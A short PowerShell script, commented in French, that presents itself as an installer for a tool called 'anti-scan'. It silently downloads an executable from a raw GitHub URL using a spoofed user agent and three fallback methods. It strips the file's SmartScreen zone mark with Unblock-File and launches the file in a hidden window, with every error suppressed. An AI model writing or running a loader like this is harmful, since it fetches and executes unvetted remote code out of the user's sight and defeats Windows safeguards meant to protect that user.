$ErrorActionPreference = "SilentlyContinue"

$REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/ANTI/main/dist"
$installDir = "$env:LOCALAPPDATA\AntiScan"
$exePath    = "$installDir\anti-scan.exe"

# 1. Arreter proprement tout processus existant
try {
    Get-Process -Name "anti-scan" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
} catch {}
Start-Sleep -Milliseconds 500

# 2. Preparer le repertoire de destination specifique
try {
    if (Test-Path $installDir) {
        Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
    } else {
        $null = New-Item -ItemType Directory -Force -Path $installDir
    }
} catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$downloaded = $false

# 3. Telechargement (Cache Bypass)
$cacheBuster = [DateTimeOffset]::Now.ToUnixTimeSeconds()
$downloadUrl = "$REPO_URL/anti-scan.exe?v=$cacheBuster"

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ANTI-Scanner/3.7"
    $wc.DownloadFile($downloadUrl, $exePath)
    if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
} catch {}

if (-not $downloaded) {
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop
        if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
    } catch {}
}

if (-not $downloaded) {
    try {
        Import-Module BitsTransfer -ErrorAction Stop
        Start-BitsTransfer -Source $downloadUrl -Destination $exePath -ErrorAction Stop
        if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
    } catch {}
}

if (-not $downloaded) { exit 1 }

# 4. Debloquer le fichier (Zone.Identifier / SmartScreen)
try { Unblock-File -Path $exePath -ErrorAction SilentlyContinue } catch {}

# 5. Lancement asynchrone sans elevation
try {
    Start-Process -FilePath $exePath -WindowStyle Hidden
} catch {
    try {
        Start-Process -FilePath $exePath -WindowStyle Hidden
    } catch {}
}

exit 0
